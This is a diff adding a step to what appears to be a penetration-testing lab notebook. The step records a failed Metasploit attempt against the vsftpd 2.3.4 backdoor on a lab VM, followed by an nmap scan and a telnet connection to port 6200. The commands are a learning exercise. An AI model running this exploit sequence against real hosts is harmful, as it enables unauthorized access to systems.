@@ -67,4 +67,64 @@ Compatible Payloads
    0  payload/cmd/unix/interact                   normal  No     Unix Command, Interact with Established Connection
 ```
 
+ 14. Exploit failed to make session
+
+```
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
+
+[*] 172.16.0.22:21 - The port used by the backdoor bind listener is already open
+[-] 172.16.0.22:21 - The service on port 6200 does not appear to be a shell
+[*] Exploit completed, but no session was created.
+```
+
+6200 Backdoor?
+
+```https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html```
+
+```https://charlesreid1.com/wiki/Metasploitable/VSFTP#Opening_Backdoor```
+
+```
+─$ sudo nmap -sS 172.16.0.22 -p 6200 -vvv
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-26 21:00 EDT
+Initiating ARP Ping Scan at 21:00
+Scanning 172.16.0.22 [1 port]
+Completed ARP Ping Scan at 21:00, 0.06s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 21:00
+Completed Parallel DNS resolution of 1 host. at 21:00, 0.01s elapsed
+DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating SYN Stealth Scan at 21:00
+Scanning 172.16.0.22 [1 port]
+Discovered open port 6200/tcp on 172.16.0.22
+Completed SYN Stealth Scan at 21:00, 0.04s elapsed (1 total ports)
+Nmap scan report for 172.16.0.22
+Host is up, received arp-response (0.00046s latency).
+Scanned at 2022-10-26 21:00:23 EDT for 0s
+
+PORT     STATE SERVICE REASON
+6200/tcp open  lm-x    syn-ack ttl 64
+MAC Address: 08:00:27:1F:65:3D (Oracle VirtualBox virtual NIC)
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds
+           Raw packets sent: 2 (72B) | Rcvd: 2 (72B)
+                                                                                                                             
+┌──(kali㉿kali)-[~]
+└─$ telnet 172.16.0.22 6200
+Trying 172.16.0.22...
+Connected to 172.16.0.22.
+Escape character is '^]'.
+```
+
+```
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
+
+[*] 172.16.0.22:21 - The port used by the backdoor bind listener is already open
+[-] 172.16.0.22:21 - The service on port 6200 does not appear to be a shell
+[*] Exploit completed, but no session was created.
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
+```
+
+Still no luck
+
+
 
